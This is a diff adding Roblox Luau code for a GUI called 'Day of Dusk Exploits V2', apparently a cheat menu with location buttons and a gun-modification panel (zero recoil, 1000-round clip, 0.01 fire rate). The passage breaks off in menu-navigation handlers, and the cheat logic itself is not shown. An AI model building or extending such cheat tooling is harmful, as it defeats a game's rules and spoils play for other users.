+DayOfDuskExploitsV2.ExteriorCompound.Position = UDim2.new(0.0531561449, 0, 0.54277283, 0)
+DayOfDuskExploitsV2.ExteriorCompound.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.ExteriorCompound.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.ExteriorCompound.Text = "Exterior Compound"
+DayOfDuskExploitsV2.ExteriorCompound.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.ExteriorCompound.TextScaled = true
+DayOfDuskExploitsV2.ExteriorCompound.TextSize = 14.000
+DayOfDuskExploitsV2.ExteriorCompound.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_100.Parent = DayOfDuskExploitsV2.ExteriorCompound
+
+DayOfDuskExploitsV2.HangarPit.Name = "HangarPit"
+DayOfDuskExploitsV2.HangarPit.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.HangarPit.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.HangarPit.Position = UDim2.new(0.667774081, 0, 0.404129744, 0)
+DayOfDuskExploitsV2.HangarPit.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.HangarPit.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.HangarPit.Text = "✅ HangarPit"
+DayOfDuskExploitsV2.HangarPit.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.HangarPit.TextScaled = true
+DayOfDuskExploitsV2.HangarPit.TextSize = 14.000
+DayOfDuskExploitsV2.HangarPit.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_101.Parent = DayOfDuskExploitsV2.HangarPit
+
+DayOfDuskExploitsV2.Sewer.Name = "Sewer"
+DayOfDuskExploitsV2.Sewer.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.Sewer.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Sewer.Position = UDim2.new(0.365448534, 0, 0.404129744, 0)
+DayOfDuskExploitsV2.Sewer.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Sewer.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Sewer.Text = "🛑 Sewer"
+DayOfDuskExploitsV2.Sewer.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Sewer.TextScaled = true
+DayOfDuskExploitsV2.Sewer.TextSize = 14.000
+DayOfDuskExploitsV2.Sewer.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_102.Parent = DayOfDuskExploitsV2.Sewer
+
+DayOfDuskExploitsV2.PoliaxVendor.Name = "PoliaxVendor"
+DayOfDuskExploitsV2.PoliaxVendor.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.PoliaxVendor.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.PoliaxVendor.Position = UDim2.new(0.0564784035, 0, 0.404129744, 0)
+DayOfDuskExploitsV2.PoliaxVendor.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.PoliaxVendor.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.PoliaxVendor.Text = "Poliax Vendor"
+DayOfDuskExploitsV2.PoliaxVendor.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.PoliaxVendor.TextScaled = true
+DayOfDuskExploitsV2.PoliaxVendor.TextSize = 14.000
+DayOfDuskExploitsV2.PoliaxVendor.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_103.Parent = DayOfDuskExploitsV2.PoliaxVendor
+
+DayOfDuskExploitsV2.Jokeumbia.Name = "Jokeumbia"
+DayOfDuskExploitsV2.Jokeumbia.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.Jokeumbia.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Jokeumbia.Position = UDim2.new(0.671096325, 0, 0.268436491, 0)
+DayOfDuskExploitsV2.Jokeumbia.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Jokeumbia.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Jokeumbia.Text = "✅ Jokeumbia"
+DayOfDuskExploitsV2.Jokeumbia.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Jokeumbia.TextSize = 14.000
+DayOfDuskExploitsV2.Jokeumbia.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_104.Parent = DayOfDuskExploitsV2.Jokeumbia
+
+DayOfDuskExploitsV2.Sandingo.Name = "Sandingo"
+DayOfDuskExploitsV2.Sandingo.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.Sandingo.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Sandingo.Position = UDim2.new(0.368770808, 0, 0.268436491, 0)
+DayOfDuskExploitsV2.Sandingo.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Sandingo.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Sandingo.Text = "✅ Sandingo"
+DayOfDuskExploitsV2.Sandingo.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Sandingo.TextSize = 14.000
+DayOfDuskExploitsV2.Sandingo.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_105.Parent = DayOfDuskExploitsV2.Sandingo
+
+DayOfDuskExploitsV2.Roseweld.Name = "Roseweld"
+DayOfDuskExploitsV2.Roseweld.Parent = DayOfDuskExploitsV2.Page4
+DayOfDuskExploitsV2.Roseweld.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Roseweld.Position = UDim2.new(0.0598006621, 0, 0.268436491, 0)
+DayOfDuskExploitsV2.Roseweld.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Roseweld.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Roseweld.Text = "✅ Roseweld"
+DayOfDuskExploitsV2.Roseweld.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Roseweld.TextScaled = true
+DayOfDuskExploitsV2.Roseweld.TextSize = 14.000
+DayOfDuskExploitsV2.Roseweld.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_106.Parent = DayOfDuskExploitsV2.Roseweld
+
+DayOfDuskExploitsV2.GunModFrame.Name = "GunModFrame"
+DayOfDuskExploitsV2.GunModFrame.Parent = DayOfDuskExploitsV2.DayOfDuskExploitsV2
+DayOfDuskExploitsV2.GunModFrame.Active = true
+DayOfDuskExploitsV2.GunModFrame.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+DayOfDuskExploitsV2.GunModFrame.Position = UDim2.new(-0.5, 0, 0.209999993, 0)
+DayOfDuskExploitsV2.GunModFrame.Size = UDim2.new(0, 301, 0, 339)
+
+DayOfDuskExploitsV2.UICorner_107.Parent = DayOfDuskExploitsV2.GunModFrame
+
+DayOfDuskExploitsV2.TopBar_3.Name = "TopBar"
+DayOfDuskExploitsV2.TopBar_3.Parent = DayOfDuskExploitsV2.GunModFrame
+DayOfDuskExploitsV2.TopBar_3.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+DayOfDuskExploitsV2.TopBar_3.Size = UDim2.new(0, 301, 0, 58)
+
+DayOfDuskExploitsV2.UICorner_108.Parent = DayOfDuskExploitsV2.TopBar_3
+
+DayOfDuskExploitsV2.Frame_3.Parent = DayOfDuskExploitsV2.TopBar_3
+DayOfDuskExploitsV2.Frame_3.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+DayOfDuskExploitsV2.Frame_3.BorderSizePixel = 0
+DayOfDuskExploitsV2.Frame_3.Position = UDim2.new(0, 0, 0.741379321, 0)
+DayOfDuskExploitsV2.Frame_3.Size = UDim2.new(0, 301, 0, 15)
+
+DayOfDuskExploitsV2.TextLabel_3.Parent = DayOfDuskExploitsV2.TopBar_3
+DayOfDuskExploitsV2.TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.TextLabel_3.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.TextLabel_3.Position = UDim2.new(0.0505211912, 0, 0.137931034, 0)
+DayOfDuskExploitsV2.TextLabel_3.Size = UDim2.new(0, 270, 0, 29)
+DayOfDuskExploitsV2.TextLabel_3.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.TextLabel_3.Text = "Day of Dusk Exploits V2"
+DayOfDuskExploitsV2.TextLabel_3.TextColor3 = Color3.fromRGB(170, 0, 127)
+DayOfDuskExploitsV2.TextLabel_3.TextScaled = true
+DayOfDuskExploitsV2.TextLabel_3.TextSize = 14.000
+DayOfDuskExploitsV2.TextLabel_3.TextWrapped = true
+
+DayOfDuskExploitsV2.Transition_3.Name = "Transition"
+DayOfDuskExploitsV2.Transition_3.Parent = DayOfDuskExploitsV2.GunModFrame
+DayOfDuskExploitsV2.Transition_3.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+DayOfDuskExploitsV2.Transition_3.BorderSizePixel = 0
+DayOfDuskExploitsV2.Transition_3.Position = UDim2.new(-0.00332225906, 0, 0.126370594, 0)
+DayOfDuskExploitsV2.Transition_3.Size = UDim2.new(0, 301, 0, 296)
+DayOfDuskExploitsV2.Transition_3.ZIndex = 10
+
+DayOfDuskExploitsV2.UICorner_109.Parent = DayOfDuskExploitsV2.Transition_3
+
+DayOfDuskExploitsV2.BackToMenu9.Name = "BackToMenu9"
+DayOfDuskExploitsV2.BackToMenu9.Parent = DayOfDuskExploitsV2.GunModFrame
+DayOfDuskExploitsV2.BackToMenu9.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+DayOfDuskExploitsV2.BackToMenu9.Position = UDim2.new(0.0498338863, 0, 0.837758124, 0)
+DayOfDuskExploitsV2.BackToMenu9.Size = UDim2.new(0, 270, 0, 40)
+DayOfDuskExploitsV2.BackToMenu9.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.BackToMenu9.Text = "Back"
+DayOfDuskExploitsV2.BackToMenu9.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayOfDuskExploitsV2.BackToMenu9.TextScaled = true
+DayOfDuskExploitsV2.BackToMenu9.TextSize = 14.000
+DayOfDuskExploitsV2.BackToMenu9.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_110.Parent = DayOfDuskExploitsV2.BackToMenu9
+
+DayOfDuskExploitsV2.ExteriorCompound_2.Name = "ExteriorCompound"
+DayOfDuskExploitsV2.ExteriorCompound_2.Parent = DayOfDuskExploitsV2.GunModFrame
+DayOfDuskExploitsV2.ExteriorCompound_2.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.ExteriorCompound_2.Position = UDim2.new(0.0531561449, 0, 0.54277283, 0)
+DayOfDuskExploitsV2.ExteriorCompound_2.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.ExteriorCompound_2.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.ExteriorCompound_2.Text = "Exterior Compound"
+DayOfDuskExploitsV2.ExteriorCompound_2.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.ExteriorCompound_2.TextScaled = true
+DayOfDuskExploitsV2.ExteriorCompound_2.TextSize = 14.000
+DayOfDuskExploitsV2.ExteriorCompound_2.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_111.Parent = DayOfDuskExploitsV2.ExteriorCompound_2
+
+DayOfDuskExploitsV2.PoliaxVendor_2.Name = "PoliaxVendor"
+DayOfDuskExploitsV2.PoliaxVendor_2.Parent = DayOfDuskExploitsV2.GunModFrame
+DayOfDuskExploitsV2.PoliaxVendor_2.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.PoliaxVendor_2.Position = UDim2.new(0.0564784035, 0, 0.404129744, 0)
+DayOfDuskExploitsV2.PoliaxVendor_2.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.PoliaxVendor_2.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.PoliaxVendor_2.Text = "Poliax Vendor"
+DayOfDuskExploitsV2.PoliaxVendor_2.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.PoliaxVendor_2.TextScaled = true
+DayOfDuskExploitsV2.PoliaxVendor_2.TextSize = 14.000
+DayOfDuskExploitsV2.PoliaxVendor_2.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_112.Parent = DayOfDuskExploitsV2.PoliaxVendor_2
+
+DayOfDuskExploitsV2.Recoil.Name = "Recoil"
+DayOfDuskExploitsV2.Recoil.Parent = DayOfDuskExploitsV2.GunModFrame
+DayOfDuskExploitsV2.Recoil.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Recoil.Position = UDim2.new(0.0560000017, 0, 0.404000014, 0)
+DayOfDuskExploitsV2.Recoil.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Recoil.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Recoil.PlaceholderText = "Recoil"
+DayOfDuskExploitsV2.Recoil.Text = "0"
+DayOfDuskExploitsV2.Recoil.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Recoil.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_113.Parent = DayOfDuskExploitsV2.Recoil
+
+DayOfDuskExploitsV2.MaxClip.Name = "MaxClip"
+DayOfDuskExploitsV2.MaxClip.Parent = DayOfDuskExploitsV2.GunModFrame
+DayOfDuskExploitsV2.MaxClip.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.MaxClip.Position = UDim2.new(0.0599999987, 0, 0.268000007, 0)
+DayOfDuskExploitsV2.MaxClip.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.MaxClip.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.MaxClip.PlaceholderText = "Max Clip"
+DayOfDuskExploitsV2.MaxClip.Text = "1000"
+DayOfDuskExploitsV2.MaxClip.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.MaxClip.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_114.Parent = DayOfDuskExploitsV2.MaxClip
+
+DayOfDuskExploitsV2.FireRate.Name = "FireRate"
+DayOfDuskExploitsV2.FireRate.Parent = DayOfDuskExploitsV2.GunModFrame
+DayOfDuskExploitsV2.FireRate.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.FireRate.Position = UDim2.new(0.0500000007, 0, 0.677999973, 0)
+DayOfDuskExploitsV2.FireRate.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.FireRate.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.FireRate.PlaceholderText = "Fire Rate"
+DayOfDuskExploitsV2.FireRate.Text = "0.01"
+DayOfDuskExploitsV2.FireRate.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.FireRate.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_115.Parent = DayOfDuskExploitsV2.FireRate
+
+DayOfDuskExploitsV2.FireMode.Name = "FireMode"
+DayOfDuskExploitsV2.FireMode.Parent = DayOfDuskExploitsV2.GunModFrame
+DayOfDuskExploitsV2.FireMode.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.FireMode.Position = UDim2.new(0.0529999994, 0, 0.542999983, 0)
+DayOfDuskExploitsV2.FireMode.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.FireMode.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.FireMode.PlaceholderText = "Firing Type"
+DayOfDuskExploitsV2.FireMode.Text = "auto"
+DayOfDuskExploitsV2.FireMode.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.FireMode.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_116.Parent = DayOfDuskExploitsV2.FireMode
+
+DayOfDuskExploitsV2.GunModLabel1.Name = "GunModLabel1"
+DayOfDuskExploitsV2.GunModLabel1.Parent = DayOfDuskExploitsV2.GunModFrame
+DayOfDuskExploitsV2.GunModLabel1.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.GunModLabel1.Position = UDim2.new(0.0505211912, 0, 0.171091452, 0)
+DayOfDuskExploitsV2.GunModLabel1.Size = UDim2.new(0, 269, 0, 19)
+DayOfDuskExploitsV2.GunModLabel1.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.GunModLabel1.Text = "Gun Modification Configuration"
+DayOfDuskExploitsV2.GunModLabel1.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.GunModLabel1.TextSize = 14.000
+DayOfDuskExploitsV2.GunModLabel1.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_117.Parent = DayOfDuskExploitsV2.GunModLabel1
+
+DayOfDuskExploitsV2.MaxClipLabel.Name = "MaxClipLabel"
+DayOfDuskExploitsV2.MaxClipLabel.Parent = DayOfDuskExploitsV2.GunModFrame
+DayOfDuskExploitsV2.MaxClipLabel.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.MaxClipLabel.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.MaxClipLabel.Position = UDim2.new(0.381963491, 0, 0.268000007, 0)
+DayOfDuskExploitsV2.MaxClipLabel.Size = UDim2.new(0, 172, 0, 40)
+DayOfDuskExploitsV2.MaxClipLabel.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.MaxClipLabel.Text = "Maximum ammo in a clip"
+DayOfDuskExploitsV2.MaxClipLabel.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.MaxClipLabel.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_118.Parent = DayOfDuskExploitsV2.MaxClipLabel
+
+DayOfDuskExploitsV2.RecoilLabel.Name = "RecoilLabel"
+DayOfDuskExploitsV2.RecoilLabel.Parent = DayOfDuskExploitsV2.GunModFrame
+DayOfDuskExploitsV2.RecoilLabel.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.RecoilLabel.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.RecoilLabel.Position = UDim2.new(0.381963491, 0, 0.403693229, 0)
+DayOfDuskExploitsV2.RecoilLabel.Size = UDim2.new(0, 172, 0, 40)
+DayOfDuskExploitsV2.RecoilLabel.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.RecoilLabel.Text = "Recoil"
+DayOfDuskExploitsV2.RecoilLabel.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.RecoilLabel.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_119.Parent = DayOfDuskExploitsV2.RecoilLabel
+
+DayOfDuskExploitsV2.FireRateLabel.Name = "FireRateLabel"
+DayOfDuskExploitsV2.FireRateLabel.Parent = DayOfDuskExploitsV2.GunModFrame
+DayOfDuskExploitsV2.FireRateLabel.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.FireRateLabel.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.FireRateLabel.Position = UDim2.new(0.381963491, 0, 0.678029537, 0)
+DayOfDuskExploitsV2.FireRateLabel.Size = UDim2.new(0, 172, 0, 40)
+DayOfDuskExploitsV2.FireRateLabel.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.FireRateLabel.Text = "The rate of fire"
+DayOfDuskExploitsV2.FireRateLabel.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.FireRateLabel.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_120.Parent = DayOfDuskExploitsV2.FireRateLabel
+
+DayOfDuskExploitsV2.GunModeLabel.Name = "GunModeLabel"
+DayOfDuskExploitsV2.GunModeLabel.Parent = DayOfDuskExploitsV2.GunModFrame
+DayOfDuskExploitsV2.GunModeLabel.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.GunModeLabel.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.GunModeLabel.Position = UDim2.new(0.381963491, 0, 0.542336285, 0)
+DayOfDuskExploitsV2.GunModeLabel.Size = UDim2.new(0, 172, 0, 40)
+DayOfDuskExploitsV2.GunModeLabel.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.GunModeLabel.Text = "Gun type"
+DayOfDuskExploitsV2.GunModeLabel.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.GunModeLabel.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_121.Parent = DayOfDuskExploitsV2.GunModeLabel
+
+DayOfDuskExploitsV2.MaximiseFrame.Name = "MaximiseFrame"
+DayOfDuskExploitsV2.MaximiseFrame.Parent = DayOfDuskExploitsV2.DayOfDuskExploitsV2
+DayOfDuskExploitsV2.MaximiseFrame.Active = true
+DayOfDuskExploitsV2.MaximiseFrame.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+DayOfDuskExploitsV2.MaximiseFrame.Position = UDim2.new(-0.300000012, 0, 0.578999996, 0)
+DayOfDuskExploitsV2.MaximiseFrame.Size = UDim2.new(0, 205, 0, 93)
+
+DayOfDuskExploitsV2.UICorner_122.Parent = DayOfDuskExploitsV2.MaximiseFrame
+
+DayOfDuskExploitsV2.TopBar_4.Name = "TopBar"
+DayOfDuskExploitsV2.TopBar_4.Parent = DayOfDuskExploitsV2.MaximiseFrame
+DayOfDuskExploitsV2.TopBar_4.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+DayOfDuskExploitsV2.TopBar_4.Size = UDim2.new(0, 205, 0, 58)
+
+DayOfDuskExploitsV2.UICorner_123.Parent = DayOfDuskExploitsV2.TopBar_4
+
+DayOfDuskExploitsV2.Frame_4.Parent = DayOfDuskExploitsV2.TopBar_4
+DayOfDuskExploitsV2.Frame_4.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+DayOfDuskExploitsV2.Frame_4.BorderSizePixel = 0
+DayOfDuskExploitsV2.Frame_4.Position = UDim2.new(0, 0, 0.741379321, 0)
+DayOfDuskExploitsV2.Frame_4.Size = UDim2.new(0, 205, 0, 15)
+
+DayOfDuskExploitsV2.TextLabel_4.Parent = DayOfDuskExploitsV2.TopBar_4
+DayOfDuskExploitsV2.TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.TextLabel_4.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.TextLabel_4.Position = UDim2.new(0.0407650843, 0, 0.120689653, 0)
+DayOfDuskExploitsV2.TextLabel_4.Size = UDim2.new(0, 188, 0, 29)
+DayOfDuskExploitsV2.TextLabel_4.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.TextLabel_4.Text = "Day of Dusk Exploits V2"
+DayOfDuskExploitsV2.TextLabel_4.TextColor3 = Color3.fromRGB(170, 0, 127)
+DayOfDuskExploitsV2.TextLabel_4.TextScaled = true
+DayOfDuskExploitsV2.TextLabel_4.TextSize = 14.000
+DayOfDuskExploitsV2.TextLabel_4.TextWrapped = true
+
+DayOfDuskExploitsV2.Transition_4.Name = "Transition"
+DayOfDuskExploitsV2.Transition_4.Parent = DayOfDuskExploitsV2.MaximiseFrame
+DayOfDuskExploitsV2.Transition_4.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+DayOfDuskExploitsV2.Transition_4.BorderSizePixel = 0
+DayOfDuskExploitsV2.Transition_4.Position = UDim2.new(-0.00487804879, 0, 0.462365597, 0)
+DayOfDuskExploitsV2.Transition_4.Size = UDim2.new(0, 205, 0, 50)
+DayOfDuskExploitsV2.Transition_4.ZIndex = 10
+
+DayOfDuskExploitsV2.UICorner_124.Parent = DayOfDuskExploitsV2.Transition_4
+
+DayOfDuskExploitsV2.Maximise.Name = "Maximise"
+DayOfDuskExploitsV2.Maximise.Parent = DayOfDuskExploitsV2.MaximiseFrame
+DayOfDuskExploitsV2.Maximise.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.Maximise.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.Maximise.Size = UDim2.new(1, 0, 1, 0)
+
+DayOfDuskExploitsV2.Maximise_2.Name = "Maximise"
+DayOfDuskExploitsV2.Maximise_2.Parent = DayOfDuskExploitsV2.Maximise
+DayOfDuskExploitsV2.Maximise_2.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Maximise_2.Position = UDim2.new(0.635887027, 0, 0.579271436, 0)
+DayOfDuskExploitsV2.Maximise_2.Size = UDim2.new(0, 50, 0, 30)
+DayOfDuskExploitsV2.Maximise_2.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Maximise_2.Text = "+"
+DayOfDuskExploitsV2.Maximise_2.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Maximise_2.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_125.Parent = DayOfDuskExploitsV2.Maximise_2
+
+DayOfDuskExploitsV2.Close_2.Name = "Close"
+DayOfDuskExploitsV2.Close_2.Parent = DayOfDuskExploitsV2.Maximise
+DayOfDuskExploitsV2.Close_2.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Close_2.Position = UDim2.new(0.118813857, 0, 0.579502225, 0)
+DayOfDuskExploitsV2.Close_2.Size = UDim2.new(0, 50, 0, 30)
+DayOfDuskExploitsV2.Close_2.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Close_2.Text = "X"
+DayOfDuskExploitsV2.Close_2.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Close_2.TextSize = 14.000
+
+DayOfDuskExploitsV2.UICorner_126.Parent = DayOfDuskExploitsV2.Close_2
+
+DayOfDuskExploitsV2.Sound_1.Parent = DayOfDuskExploitsV2.DayOfDuskExploitsV2
+DayOfDuskExploitsV2.Sound_1.Volume = 2
+DayOfDuskExploitsV2.Sound_1.Name = "Hover"
+DayOfDuskExploitsV2.Sound_1.SoundId = "rbxassetid://".. 3057956788
+
+DayOfDuskExploitsV2.Sound_2.Parent = DayOfDuskExploitsV2.SettingsFrame
+DayOfDuskExploitsV2.Sound_2.Volume = 2
+DayOfDuskExploitsV2.Sound_2.Name = "CheckBoxClick"
+DayOfDuskExploitsV2.Sound_2.SoundId = "rbxassetid://".. 179235828
+
+DayOfDuskExploitsV2.Sound_3.Parent = DayOfDuskExploitsV2.Maximise
+DayOfDuskExploitsV2.Sound_3.Volume = 2
+DayOfDuskExploitsV2.Sound_3.Name = "Click"
+DayOfDuskExploitsV2.Sound_3.SoundId = "rbxassetid://".. 179235828
+
+for i,v in pairs(DayOfDuskExploitsV2.DayOfDuskExploitsV2:GetDescendants()) do
+	if v:IsA("TextButton") then
+		v.MouseEnter:Connect(function()
+			DayOfDuskExploitsV2.Sound_1:Play()
+		end)
+	end
+end
+
+
+
+--scripts--
+
+local function GDTWJ_fake_script() -- GunModFrame.GunModFrameHandler 
+	local script = Instance.new('LocalScript', DayOfDuskExploitsV2.GunModFrame)
+
+	script.Parent.BackToMenu9.MouseButton1Up:Connect(function()
+		script.Parent.Transition:TweenSize(UDim2.new(0, 301,0, 293),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+		wait(0.5)
+		script.Parent:TweenPosition(UDim2.new(-0.5, 0,0.21, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.MainFrame:TweenPosition(UDim2.new(0, 0,0.244, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,false)
+		wait(0.5)
+		script.Parent.Parent.MainFrame.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+	end)
+end
+coroutine.wrap(GDTWJ_fake_script)()
+local function KNFVWF_fake_script() -- MenuFrame.MenuFrameHandler 
+	local script = Instance.new('LocalScript', DayOfDuskExploitsV2.MenuFrame)
+
+	local InUse = false
+	local InfinateYield = false
+	script.Parent.CreditsButton.MouseButton1Up:Connect(function()
+		if not InUse then
+			InUse = true
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 275),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			script.Parent.Visible = false
+			script.Parent.Parent.CreditsFrame.Visible = true
+			wait(0.1)
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			InUse = false
+		end
+	end)
+	script.Parent.InfoButton.MouseButton1Up:Connect(function()
+		if not InUse then
+			InUse = true
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 275),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			script.Parent.Visible = false
+			script.Parent.Parent.InfoFrame.Visible = true
+			wait(0.1)
+			script.Parent.Parent.Transition:TweenSize(UDim2.new(0, 205,0, 0),Enum.EasingDirection.InOut,Enum.EasingStyle.Quad,0.5,true)
+			wait(0.5)
+			InUse = false
+		end	
+	end)
+	script.Parent.SettingsButton.MouseButton1Up:Connect(function()
+		if not InUse then
+			InUse = true
